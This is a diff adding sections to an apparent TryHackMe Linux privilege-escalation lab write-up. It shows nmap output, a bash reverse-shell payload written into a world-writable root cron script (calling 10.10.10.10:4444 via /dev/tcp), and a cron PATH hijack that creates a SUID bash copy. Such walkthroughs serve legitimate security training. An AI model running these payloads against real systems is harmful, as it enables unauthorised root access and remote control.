@@ -1,6 +1,42 @@
 # TRYHACKME : Linux PrivEsc
 Deploy the target machine, and enter the following ssh credentials: `user:password321`
 
+Let's perform a basic nmap scan:
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 a4:6c:d1:c8:5b:03:f2:af:33:3f:84:15:cf:15:ed:ba (DSA)
+|_  2048 08:84:3e:96:4d:9a:2f:a1:db:be:68:29:80:ab:f3:56 (RSA)
+25/tcp   open  smtp    Exim smtpd 4.84
+| smtp-commands: debian.localdomain Hello ip-10-4-124-80.eu-west-1.compute.internal [10.4.124.80], SIZE 52428800, 8BITMIME, PIPELINING, HELP
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP
+80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
+|_http-server-header: Apache/2.2.16 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind 2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100005  1,2,3      49840/tcp   mountd
+|   100005  1,2,3      54262/udp   mountd
+|   100021  1,3,4      50744/udp   nlockmgr
+|   100021  1,3,4      60890/tcp   nlockmgr
+|   100024  1          35973/udp   status
+|_  100024  1          53668/tcp   status
+2049/tcp open  nfs     2-4 (RPC #100003)
+8080/tcp open  http    nginx 1.6.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.6.2
+|_http-title: Welcome to nginx on Debian!
+Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
 ## Service Exploits
 Simply copy in consecutive order the ff commands:
 ```
@@ -176,4 +212,71 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 * * * * * root overwrite.sh
 * * * * * root /usr/local/bin/compress.sh
 ```
+
+Below are the two shell scripts scheduled to run: `overwrite.sh` & `/usr/local/bin/compress.sh`
+
+Let's find out the permissions we have to each of these scripts:
+```
+// FOR compress.sh
+
+user@debian:~$ ls -l /usr/local/bin/compress.sh
+-rwxr--r-- 1 root staff 53 May 13  2017 /usr/local/bin/compress.sh          // we don't have luck with this one
+
+
+// FOR overwrite.sh
+
+user@debian:~$ locate overwrite.sh
+locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1829.4 days)
+/usr/local/bin/overwrite.sh
+user@debian:~$ ls -l /usr/local/bin/overwrite.sh
+-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh        // lucky! it's writable
+```
+
+Now let's do the work.
+
+Open the shell file and replace it with the ff. payload to start reverse shell with our `tun0` ip and port.
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+Start your netcat listener after editing the script file.
+
+And voila, root access!
+
+## Cron Jobs - PATH Environment Variable
+
+From previous `cat /etc/crontab`, these are the listed PATH variables:
+```
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+The `/home/user` PATH seems to also run scheduled cronjobs.
+
+Let's now create an executable file for exploit:
+```
+vim overwrite.sh
+
++++ ADD THE FOLLOWING +++
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
++++++++++++++++++++++++++
+
+chmod +x /home/user/overwrite.sh
+```
+
+Wait for a minute for cronjob to run the following script. 
+
+Then run the ff. command:
+```
+/tmp/rootbash -p
+```
+
+Voila, root!
+
+## Cron Jobs - Wildcards
+
 
